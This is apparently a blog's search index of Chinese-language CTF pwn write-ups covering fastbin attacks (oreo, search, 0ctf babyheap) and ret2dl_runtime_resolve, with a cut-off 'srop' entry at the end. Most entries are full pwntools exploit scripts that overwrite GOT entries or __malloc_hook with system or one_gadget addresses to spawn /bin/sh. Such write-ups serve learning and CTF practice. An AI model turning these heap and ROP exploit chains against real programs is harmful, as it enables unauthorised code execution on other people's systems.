<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[fastbinin_attack]]></title>
    <url>%2F2020%2F02%2F07%2Ffastbinin-attack%2F</url>
    <content type="text"><![CDATA[就把wiki上的三道题稍微看了一下，了解了一下下fastbin attack，但是。。。依旧不算太清醒好了，废话不多说，开始吧 2014 hack.lu oreoadd里面的rifle name是从a288+25开始写，然后description是直接从a288处开始的，总共长度是56字节，地址占了四个字节，56-4 =52 description占25，name则占27具体看汇编v1是pre指针 为eax+52，即最后四个字节为指针地址，而这个指针指向的是description。我们可以写入的name有为56，存在溢出，可以覆写pre的地址 show这里show的内容description是指针指向的地址我们可以借此leak出libc massage进行更改的地方是a2a8里存着的地址指向的地方，利用此来get shell order这里就是free，free完之后a2a0+1 1、使pre覆写成puts_got的地址，show的时候，description里面的内容为puts_addr2、构造一个fack chunk，我们知道呢，一个chunk的结构大概是，pre_size, size,内容。我们知道a2a4的地方是写add一次就+1，a2a0是free一次+1，a2a8是存放massage指向内容的地址，可以利用这个构建一个chunk，又因为要绕过题目检查，又存name的地方也有存description的地方，所以要构造下一个chunk，把size 0x41写进去3、改一个got表为system即可，这里改的是scanf，wiki里面改的是strlen（对这个函数我不是很熟，不太懂system最后的传参，就没用了），据说还可以改free_hook 为onegadget（我不会找free_hook的地址，全网搜貌似也没搜出来用这种方法的exp） 关于wiki上的exp，看了大佬的博客之后才知道以下的姿势（关于strlen的传参）这样就相当于往0x0804a250指向的地址写入system。这里有个新姿势：system(“ls;/bin/sh”)就相当于sytem(“ls”);system(“/bin/sh”);分号代表system函数将这个参数分成两部分，先后执行里面的命令。因此这里在fgets函数篡改了strlen_got后紧接着调用strlen，就相当于system(p32(system_addr);”/bin/sh”) = system(p32(system_addr));system(“/bin/sh”);这样就能实现最终目的了。 exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *from time import sleepimport sys# context.binary = &quot;./melong&quot;context.log_level =&apos;DEBUG&apos;p = process(&apos;./oreo&apos;)elf = ELF(&apos;./oreo&apos;)libc = ELF(&apos;./libc.so.6&apos;)def add(name,description): # p.recvuntil(&quot;6. Exit!&quot;) # p.recvuntil(&quot;Action: &quot;) p.sendline(&quot;1&quot;) # p.recvuntil(&quot;Rifle name: &quot;) p.sendline(name) # p.recvuntil(&quot;Rifle description: &quot;) p.sendline(description)def show(): # p.recvuntil(&quot;Action: &quot;) p.sendline(&quot;2&quot;) p.recvuntil(&apos;===================================\n&apos;)def order(): # p.recvuntil(&quot;Action: &quot;) p.sendline(&quot;3&quot;)def massage(notice): # p.recvuntil(&quot;Action: &quot;) p.sendline(&quot;4&quot;) p.sendline(notice)p.recv()name = 27 * &apos;a&apos; + p32(elf.got[&apos;puts&apos;])add(name ,25 * &apos;a&apos;)show()p.recvuntil(&apos;===================================\n&apos;)p.recvuntil(&apos;Description: &apos;)puts_addr = u32(p.recvuntil(&apos;\n&apos;, drop=True)[:4])print hex(puts_addr)libc_base = puts_addr - libc.sym[&apos;puts&apos;]print hex(libc_base)# libc_base = libc.addresssystem_addr = libc_base + libc.sym[&apos;system&apos;]binsh_addr = libc_base + next(libc.search(&quot;/bin/sh&quot;))onegadget = libc_base + 0x5fbc6 #尝试过把scanf改成onegadget，但是五个都没成功。。。i=1for i in range(0x3f): add(&apos;a&apos; * 27 + p32(0),25 * &apos;a&apos;) #num -&gt; 0x41#num addr = 0x804A2A4#fack chunkadd(&apos;a&apos;*27+p32(0x804A2A8),&apos;a&apos;*25)massage(&apos;\x00&apos;*0x24+p32(0x41)) #description&apos;s chunkorder()scanf_got = elf.got[&apos;__isoc99_sscanf&apos;]add(&apos;a&apos;,p32(scanf_got))massage(p32(system_addr))p.sendline(&apos;/bin/sh&apos;)p.interactive() 2015 search这题就没有很认真的写wp，就把不太明白的点记一下吧 一开始一直没想到free完一次之后可以查找’\x00’这个word，就一直很迷惑要怎么double free分析两个一开始没懂的点 123456789101112131415161718192021index_sentence(&apos;a&apos; * 0x5d + &apos; d &apos;) #aindex_sentence(&apos;b&apos; * 0x5d + &apos; d &apos;) #bindex_sentence(&apos;c&apos; * 0x5d + &apos; d &apos;) #c # a-&gt;b-&gt;c-&gt;NULL search_word(&apos;d&apos;) #正常的删除 p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;) p.sendline(&apos;y&apos;) p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;) p.sendline(&apos;y&apos;) p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;) p.sendline(&apos;y&apos;) # b-&gt;a-&gt;b-&gt;a-&gt;... search_word(&apos;\x00&apos;) #首先判断c是否满足条件，由于c是fastbin中的最后一个节点，其fd的值为0，因此不能满足i-&gt;sentence != NULL的条件，因此第一个输出时候删除的是对应的b p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;) #删除b p.sendline(&apos;y&apos;) p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;) #删除a p.sendline(&apos;n&apos;) p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;) #删除 libc_leak的时候添加的sentence p.sendline(&apos;n&apos;) 最后是只删除了b使得 a-&gt;b-&gt;c-&gt;null 又多了一个头变成了 b-&gt; a-&gt;b-&gt;c-&gt;null 即形成了b-&gt;a-&gt;b-&gt;a-&gt;…的循环，形成了double free 1234567891011121314 #此时的fastbin为 b-&gt;a-&gt;b# 3. fastbin attack to malloc_hook nearby chunk 向malloc_hook中写东西，改写b-&gt;fd，使其指向malloc_hook附近fake_chunk_addr = main_arena_addr - 0x33fake_chunk = p64(fake_chunk_addr).ljust(0x60, &apos;f&apos;) index_sentence(fake_chunk) #b的fd改成fake_addrs index_sentence(&apos;a&apos; * 0x60) #分配chunk_a index_sentence(&apos;b&apos; * 0x60) #分配chunk_b 填了chunk_b之后才能往fake_chunk里面写payload one_gadget_addr = libc_base + 0xf02a4 payload = &apos;a&apos; * 0x13 + p64(one_gadget_addr) payload = payload.ljust(0x60, &apos;f&apos;) index_sentence(payload) #赋写malloc_hook为one_gadget 2017 0ctf babyheap 先介绍一下Arbitrary Alloc（来自ctf wiki） 只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等等。 example在这个例子，我们使用字节错位来实现直接分配 fastbin 到_malloc_hook 的位置，相当于覆盖_malloc_hook 来控制程序流程。 1234567891011121314 int main(void)&#123; void *chunk1; void *chunk_a; chunk1=malloc(0x60); free(chunk1); *(long long *)chunk1=0x7ffff7dd1af5-0x8; malloc(0x60); chunk_a=malloc(0x60); return 0;&#125; 这里的 0x7ffff7dd1af5 是我根据本机的情况得出的值，这个值是怎么获得的呢？首先我们要观察欲写入地址附近是否存在可以字节错位的情况。 1234567891011121314151617180x7ffff7dd1a88 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1a90 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1a98 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1aa0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1aa8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1ab0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1ab8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1ac0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1ac8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1ad0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1ad8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1ae0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1ae8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x00x7ffff7dd1af8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1b00 0x20 0x2e 0xa9 0xf7 0xff 0x7f 0x0 0x00x7ffff7dd1b08 0x0 0x2a 0xa9 0xf7 0xff 0x7f 0x0 0x00x7ffff7dd1b10 &lt;__malloc_hook&gt;: 0x30 0x28 0xa9 0xf7 0xff 0x7f 0x0 0x0 0x7ffff7dd1b10 是我们想要控制的 __malloc_hook 的地址，于是我们向上寻找是否可以错位出一个合法的 size 域。因为这个程序是 64 位的，因此 fastbin 的范围为 32 字节到 128 字节 (0x20-0x80)，如下： 12345678//这里的size指用户区域，因此要小2倍SIZE_SZFastbins[idx=0, size=0x10]Fastbins[idx=1, size=0x20]Fastbins[idx=2, size=0x30]Fastbins[idx=3, size=0x40]Fastbins[idx=4, size=0x50]Fastbins[idx=5, size=0x60]Fastbins[idx=6, size=0x70] 通过观察发现 0x7ffff7dd1af5 处可以现实错位构造出一个 0x000000000000007f 12340x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x00x7ffff7dd1af8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1af5 &lt;_IO_wide_data_0+309&gt;: 0x000000000000007f 因为 0x7f 在计算 fastbin index 时，是属于 index 5 的，即 chunk 大小为 0x70 的。 12##define fastbin_index(sz) \ ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2) （注意 sz 的大小是 unsigned int，因此只占 4 个字节）而其大小又包含了 0x10 的 chunk_header，因此我们选择分配 0x60 的 fastbin，将其加入链表。 最后经过两次分配可以观察到 chunk 被分配到 0x7ffff7dd1afd，因此我们就可以直接控制 malloc_hook 的内容 (在我的 libc 中realloc_hook 与__malloc_hook 是在连在一起的)。 1234567890x4005a8 &lt;main+66&gt; call 0x400450 &lt;malloc@plt&gt; → 0x4005ad &lt;main+71&gt; mov QWORD PTR [rbp-0x8], rax $rax : 0x7ffff7dd1afd0x7ffff7dd1aed &lt;_IO_wide_data_0+301&gt;: 0xfff7dd0260000000 0x000000000000007f0x7ffff7dd1afd: 0xfff7a92e20000000 0xfff7a92a0000007f0x7ffff7dd1b0d &lt;__realloc_hook+5&gt;: 0x000000000000007f 0x00000000000000000x7ffff7dd1b1d: 0x0000000000000000 0x0000000000000000 Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值。一般都是在5或者d处（作为最后8和0结尾的地方），所以一般alloc的里面，覆盖malloc_hook的话，要 -0x33（3结尾来对齐) okk,开始进入正题在fill里面，发现可以自己重新写size再填内容，和开始alloc的大小可以不一样，然后free没有清零，以此制造overlap 第一步先 用overlap leak基址 123456789101112131415161718192021222324252627282930313233allocate(0x10)#0 00allocate(0x10)#1 20allocate(0x10)#2 40allocate(0x10)#3 60allocate(0x80)#4 80free(2)free(1)payload = &apos;a&apos;*0x10 + p64(0) +p64(0x21) + p8(0x80) #覆写最后一字节，将free掉的2指向4的地址fill(0,len(payload),payload)payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x21) #把4的size改成0x21,下一次alloc的时候可以写入这个地方fill(3,len(payload),payload)allocate(0x10)#1allocate(0x10)#2 -&gt;4payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x91) #指向4之后再将大小改回来fill(3,len(payload),payload)# gdb.attach(p)allocate(0x80) #5 如果没有这个，free就没了，打不出来地址free(4)dump(2)#overlapp.recvuntil(&apos;Content: \n&apos;)main_arena = u64(p.recv(8))-0x58print hex(main_arena)print hex(libc.sym[&apos;__libc_start_main&apos;])libc_base = main_arena - 0x3C4B20#0x7F50FB4A9000‬ 第二步就构造chunk，使one_gadget能写到mollac_hook的地址里，0x80可以写下0x60的chunk 12345678//这里的size指用户区域，因此要小2倍SIZE_SZFastbins[idx=0, size=0x10]Fastbins[idx=1, size=0x20]Fastbins[idx=2, size=0x30]Fastbins[idx=3, size=0x40]Fastbins[idx=4, size=0x50]Fastbins[idx=5, size=0x60]Fastbins[idx=6, size=0x70] idx为5，则找7f，就开始提到的arbitrary alloc的方式 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152allocate(0x10)#1allocate(0x10)#2 -&gt;4payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x91)fill(3,len(payload),payload)# gdb.attach(p)allocate(0x80)#5free(4)dump(2)#overlapp.recvuntil(&apos;Content: \n&apos;)main_arena = u64(p.recv(8))-0x58print hex(main_arena)print hex(libc.sym[&apos;__libc_start_main&apos;])libc_base = main_arena - 0x3C4B20#0x7F50FB4A9000‬ allocate(0x60)free(4)&apos;&apos;&apos;0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: rax == NULL0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints: [rsp+0x70] == NULL&apos;&apos;&apos;target = main_arena - 0x33 addr = p64(target)fill(2,len(addr),addr)gdb.attach(p)allocate(0x60)#4allocate(0x60)#target 6onegadget = libc_base + 0x4526apayload = &apos;a&apos;*0x13 + p64(onegadget)fill(6,len(payload),payload)allocate(0x100) 完整的exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *p = process(&apos;./babyheap&apos;)elf = ELF(&apos;./babyheap&apos;)libc = ELF(&apos;./libc.so.6&apos;)context.log_level = &apos;debug&apos;#def allocate(size): p.recvuntil(&apos;Command: &apos;) p.sendline(&apos;1&apos;) p.recvuntil(&apos;Size: &apos;) p.sendline(str(size))def fill(idx, size, content): p.recvuntil(&apos;Command: &apos;) p.sendline(&apos;2&apos;) p.recvuntil(&apos;Index: &apos;) p.sendline(str(idx)) p.recvuntil(&apos;Size: &apos;) p.sendline(str(size)) p.recvuntil(&apos;Content: &apos;) p.send(content)def free(idx): p.recvuntil(&apos;Command: &apos;) p.sendline(&apos;3&apos;) p.recvuntil(&apos;Index: &apos;) p.sendline(str(idx))def dump(idx): p.recvuntil(&apos;Command: &apos;) p.sendline(&apos;4&apos;) p.recvuntil(&apos;Index: &apos;) p.sendline(str(idx))allocate(0x10)#0 00allocate(0x10)#1 20allocate(0x10)#2 40allocate(0x10)#3 60allocate(0x80)#4 80free(2)free(1)payload = &apos;a&apos;*0x10 + p64(0) +p64(0x21) + p8(0x80)fill(0,len(payload),payload)payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x21)fill(3,len(payload),payload)allocate(0x10)#1allocate(0x10)#2 -&gt;4payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x91)fill(3,len(payload),payload)# gdb.attach(p)allocate(0x80)#5free(4)dump(2)#overlapp.recvuntil(&apos;Content: \n&apos;)main_arena = u64(p.recv(8))-0x58print hex(main_arena)print hex(libc.sym[&apos;__libc_start_main&apos;])libc_base = main_arena - 0x3C4B20#0x7F50FB4A9000‬ allocate(0x60)free(4)&apos;&apos;&apos;0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: rax == NULL0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints: [rsp+0x70] == NULL&apos;&apos;&apos;target = main_arena - 0x33 addr = p64(target)fill(2,len(addr),addr)gdb.attach(p)allocate(0x60)#4allocate(0x60)#target 6onegadget = libc_base + 0x4526apayload = &apos;a&apos;*0x13 + p64(onegadget)fill(6,len(payload),payload)allocate(0x100)p.interactive() 参考链接： https://bbs.pediy.com/thread-247214.htm https://blog.betamao.me/2018/02/25/hack-lu-ctf-2014-oreo/ https://bbs.pediy.com/thread-247219-1.htm（师傅写了两个方法，可以看看)]]></content>
  </entry>
  <entry>
    <title><![CDATA[runtime_resolve]]></title>
    <url>%2F2019%2F10%2F07%2Fruntime-resolve%2F</url>
    <content type="text"><![CDATA[做为高级rop的题目果然是令人很头疼的，这类题目是没有办法leak的（无回显），就借助_dl_runtime_resolve(link_map_obj, reloc_index)对动态链接的函数重定位 控制程序执行 dl_resolve 函数 给定 Link_map 以及 index 两个参数。 当然我们可以直接给定 plt0 对应的汇编代码，这时，我们就只需要一个 index 就足够了。控制 index 的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。 对于此类题目：关键点： .rel.plt表 .dynsym .dynstr 从rel.plt里获得某个函数在.dynsym里的偏移 再从 .dynsym 里获得.dynstr里的偏移 在 .dynstr里找到对应的字符，将这个字符解析成函数 然后贴一段我也没有理解的东西看看 1234符号版本信息 最好使得 ndx = VERSYM[(reloc-&gt;r_info) &gt;&gt; 8] 的值为 0，以便于防止找不到的情况。重定位表项r_offset 必须是可写的，因为当解析完函数后，必须把相应函数的地址填入到对应的地址。 然后参考了很多大佬的博客都提到了延迟绑定机制（就是一定要调用一次之后got表里存的才会是真实地址） 第一条的jmp的指令跳转的地址是write的got表地址，但是此时指向的是下一条指令的地址0x80483d6 push 0x20 是dl_runtime_resolve的第二个参数（reloc_arg） 然后跳到plt[0] (0x8048380) 里，将linkmap push进去，然后跳到_dl_runtime_resolve进行解析，解析后的地址将会写入到第一次的read got.plt表里，然后将程序的控制权交给解析出来的地址指向的函数(自动找到那个函数的地址) 关于四个关键函数的地址提取：plt_0 = elf.get_section_by_name(‘.plt’).header.sh_addrrel_plt = elf.get_section_by_name(‘.rel.plt’).header.sh_addrdynsym = elf.get_section_by_name(‘.dynsym’).header.sh_addrdynstr = elf.get_section_by_name(‘.dynstr’).header.sh_addr objdump -s -j .rel.plt babystackobjdump -d -j .plt babystack （直接找ida来得更快一点） readelf -S bof readelf -d bof JMPREL == .rel.pltSYMTAB == .dynsymSTRREL == .dynstrplt貌似只有-S里能找到 readelf -r bof 607 -&gt; write的.rel.plt 607&lt;&lt;8 –&gt; 6x/4wx .dynsym的地址+0x10*6 第一个参数是在str里的偏移x/s .str的地址+上面的偏移 得到的是函数名的字符串x/3i 要查函数的plt表地址 Jmp –&gt; got表地址Push –&gt; size(0x20) 是dl_runtime_resolve的第二个参数（reloc_arg）Jmp –&gt; plt[0]的地址 再——link_map = *(GOT+4) == (GOT[1]-&gt;链接器的标识信息)作为参数存入栈中GOT2是动态链接器的入口点–&gt;存着_dl_runtime_resolve的地址 _dl_runtime_resolve：完成符号的解析（内部会调用_dl_fixup）（找到真实地址存入got） —— 本题是将write的真实地址写入got，并把控制权交给write 漏洞利用方式：1、控制eip为plt[0]的地址，只需传入一个index_arg参数即可2、控制index_arg的大小，使reloc的信息存入可控地址3、伪造reloc内容，使sym在可控地址4、伪造sym内容，是name在可控地址5、伪造name为任意库函数，达到我们想要的效果 我们来分步完成我们想要的效果吧（有write的函数其实就不需要这个方法了吧…） Part1：直接用write函数，查看最后输出效果 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *p = process(&apos;./bof&apos;)elf = ELF(&apos;./bof&apos;)rel_plt = 0x08048330plt_0 = 0x08048380dynsym = 0x080481d8dynstr = 0x08048278leave_ret = 0x08048458pop_ebp = 0x0804861b ppp_ret = 0x08048619 #pop esi ; pop edi ; pop ebp ; retbss_addr = 0x0804a040 #readelf -S bof | grep &quot;.bss&quot;stack_size = 0x800base_stage = bss_addr + stack_sizeread_plt = elf.plt[&apos;read&apos;]write_plt = elf.plt[&apos;write&apos;]write_got = elf.got[&apos;write&apos;]fake_sym_addr = base_stage + 36 align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10 r_info = index_dynsym &lt;&lt; 8 | 0x7fake_reloc = p32(write_got) + p32(r_info) st_name = fake_sym_addr + 0x10 - dynstrfake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)index_offset = (base_stage + 28) - rel_plt#stage 1 bss_addrpayload = &quot;a&quot;*112 payload += p32(read_plt) # 读100个字节到base_stagepayload += p32(ppp_ret)payload += p32(0)payload += p32(base_stage)payload += p32(100)payload += p32(pop_ebp) # 把base_stage pop到ebp中payload += p32(base_stage)payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stagep.sendline(payload)cmd = &quot;/bin/sh\x00&quot;payload1 = &apos;aaaa&apos;payload1 += p32(write_plt)payload1 += &apos;aaaa&apos;payload1 += p32(1)payload1 += p32(base_stage+80)payload1 += p32(len(cmd))payload1 += &apos;A&apos; * (80 - len(payload1))payload1 += cmdpayload1 += &apos;A&apos; * (100 - len(payload1))p.sendline(payload1)p.interactive() “/bin/sh“被打出来了 Part 2控制eip为pit[0]地址 12345678910111213141516cmd = &quot;/bin/sh\x00&quot;plt_0 = 0x08048380 # objdump -d -j .plt bofindex_offset = 0x20 # write&apos;s indexpayload2 = &apos;aaaa&apos;payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += &apos;aaaa&apos;payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += &apos;A&apos; * (80 - len(payload2))payload2 += cmd payload2 += &apos;A&apos; * (100 - len(payload2))p.sendline(payload2)p.interactive() Part 3控制index_offset 指向fake_reloc 123456789101112131415161718192021cmd = &quot;/bin/sh\x00&quot;plt_0 = 0x08048380 # objdump -d -j .plt bofrel_plt = 0x08048330 # objdump -s -j .rel.plt bofindex_offset = (base_stage + 28) - rel_plt # base_stage + 28指向fake_reloc，减去rel_plt即偏移write_got = elf.got[&apos;write&apos;]r_info = 0x607 # write: Elf32_Rel-&gt;r_infofake_reloc = p32(write_got) + p32(r_info)payload2 = &apos;aaaa&apos;payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += &apos;aaaa&apos;payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += fake_reloc # (base_stage+28)的位置payload2 += &apos;A&apos; * (80 - len(payload2))payload2 += cmd payload2 += &apos;A&apos; * (100 - len(payload2))p.sendline(payload2)p.interactive() Part 4伪造fake_sym 指向st_name 12345678910111213141516171819202122232425262728293031cmd = &quot;/bin/sh\x00&quot;plt_0 = 0x08048380rel_plt = 0x08048330index_offset = (base_stage + 28) - rel_pltwrite_got = elf.got[&apos;write&apos;]dynsym = 0x080481d8dynstr = 0x08048278fake_sym_addr = base_stage + 36align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) # 这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10 # 除以0x10因为Elf32_Sym结构体的大小为0x10，得到write的dynsym索引号r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)st_name = 0x4cfake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)payload2 = &apos;AAAA&apos;payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += &apos;AAAA&apos;payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += fake_reloc # (base_stage+28)的位置payload2 += &apos;B&apos; * alignpayload2 += fake_sym # (base_stage+36)的位置payload2 += &apos;A&apos; * (80 - len(payload2))payload2 += cmd payload2 += &apos;A&apos; * (100 - len(payload2))p.sendline(payload2)p.interactive() Part 5St_name指向 ‘write’，继续回显 1234567891011121314151617181920212223242526272829303132plt_0 = 0x08048380rel_plt = 0x08048330index_offset = (base_stage + 28) - rel_pltwrite_got = elf.got[&apos;write&apos;]dynsym = 0x080481d8dynstr = 0x08048278fake_sym_addr = base_stage + 36align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)st_name = (fake_sym_addr + 0x10) - dynstr # 加0x10因为Elf32_Sym的大小为0x10fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)payload2 = &apos;AAAA&apos;payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += &apos;AAAA&apos;payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += fake_reloc # (base_stage+28)的位置payload2 += &apos;B&apos; * alignpayload2 += fake_sym # (base_stage+36)的位置payload2 += &quot;write\x00&quot;payload2 += &apos;A&apos; * (80 - len(payload2))payload2 += cmd payload2 += &apos;A&apos; * (100 - len(payload2))p.sendline(payload2)p.interactive() Part 6把write改成system来getshell 123456789101112131415161718192021222324252627282930313233cmd = &quot;/bin/sh\x00&quot;plt_0 = 0x08048380rel_plt = 0x08048330index_offset = (base_stage + 28) - rel_pltwrite_got = elf.got[&apos;write&apos;]dynsym = 0x080481d8dynstr = 0x08048278fake_sym_addr = base_stage + 36align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)st_name = (fake_sym_addr + 0x10) - dynstrfake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)payload2 = &apos;AAAA&apos;payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += &apos;AAAA&apos;payload2 += p32(base_stage + 80)payload2 += &apos;aaaa&apos;payload2 += &apos;aaaa&apos;payload2 += fake_reloc # (base_stage+28)的位置payload2 += &apos;B&apos; * alignpayload2 += fake_sym # (base_stage+36)的位置payload2 += &quot;system\x00&quot;payload2 += &apos;A&apos; * (80 - len(payload2))payload2 += cmdpayload2 += &apos;A&apos; * (100 - len(payload2))p.sendline(payload2)p.interactive() 就可以成功getshell了！！！ 完整exp python123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566# -*- coding: utf-8 -*-from pwn import *p = process(&apos;./bof&apos;)elf = ELF(&apos;./bof&apos;)rel_plt = 0x08048330plt_0 = 0x08048380dynsym = 0x080481d8dynstr = 0x08048278leave_ret = 0x08048458pop_ebp = 0x0804861b ppp_ret = 0x08048619 #pop esi ; pop edi ; pop ebp ; retbss_addr = 0x0804a040 #readelf -S bof | grep &quot;.bss&quot;stack_size = 0x800base_stage = bss_addr + stack_sizeread_plt = elf.plt[&apos;read&apos;]write_plt = elf.plt[&apos;write&apos;]write_got = elf.got[&apos;write&apos;]fake_sym_addr = base_stage + 36 align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10 r_info = index_dynsym &lt;&lt; 8 | 0x7fake_reloc = p32(write_got) + p32(r_info) st_name = fake_sym_addr + 0x10 - dynstrfake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)index_offset = (base_stage + 28) - rel_plt#stage 1 bss_addrpayload = &quot;a&quot;*112 payload += p32(read_plt) # 读100个字节到base_stagepayload += p32(ppp_ret)payload += p32(0)payload += p32(base_stage)payload += p32(100)payload += p32(pop_ebp) # 把base_stage pop到ebp中payload += p32(base_stage)payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stagep.sendline(payload)#stage 2 system(&apos;/bin/sh&apos;)payload2 = &apos;AAAA&apos;payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += &apos;AAAA&apos;payload2 += p32(base_stage + 80)payload2 += &apos;AAAA&apos;payload2 += &apos;AAAA&apos;payload2 += fake_reloc # stack_addr+28payload2 += &apos;A&apos; * alignpayload2 += fake_sym # stack_addr+36+alignpayload2 += &quot;system\x00&quot;payload2 += &apos;A&apos; * (80 - len(payload2))payload2 += &quot;/bin/sh\x00&quot;payload2 += &apos;A&apos; * (100 - len(payload2))p.sendline(payload2)p.interactive()]]></content>
  </entry>
  <entry>
    <title><![CDATA[srop]]></title>
    <url>%2F2019%2F09%2F02%2Fsrop%2F</url>
